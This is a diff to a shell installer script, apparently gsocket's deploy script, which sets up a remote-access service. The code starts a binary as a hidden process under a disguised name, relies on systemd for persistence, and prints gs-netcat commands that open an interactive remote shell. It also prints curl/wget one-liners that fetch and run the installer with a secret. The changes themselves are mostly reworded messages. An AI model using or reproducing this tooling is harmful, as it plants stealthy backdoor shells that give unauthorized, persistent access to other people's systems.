@@ -603,6 +603,12 @@ gs_access()
 	"${DSTBIN}" -s "${GS_SECRET}" -i
 	ret=$?
 	[[ $ret -eq 139 ]] && { WARN_EXECFAIL_SET "$?" "SIGSEGV"; WARN_EXECFAIL; errexit; }
+	[[ $ret -eq 61 ]] && {
+		echo -e 2>&1 "--> ${CR}Could not connect to the remote host. It is not installed.${CN}"
+		echo -e 2>&1 "--> ${CR}To install use one of the following:${CN}"
+		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_CRL}${CN}"
+		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_WGT}${CN}"
+	}
 
 	exit_code "$ret"
 }
@@ -754,7 +760,7 @@ if [[ -z "$IS_INSTALLED" ]]; then
 	echo -e 1>&1 "--> ${CR}Access will be lost after reboot.${CN}"
 fi
 # After all install attempts output help how to uninstall
-echo -e 1>&2 "--> To uninstall type ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
+echo -e 1>&2 "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
 
 printf 1>&2 "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
 if [[ -n "$IS_SYSTEMD" ]]; then
@@ -810,7 +816,7 @@ elif [[ -z "$IS_GS_RUNNING" ]]; then
 	fi
 fi
 
-echo -e 1>&2 "--> To connect type one of the following:
+echo -e 1>&2 "--> To connect use one of the following:
 --> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
 --> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
 --> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
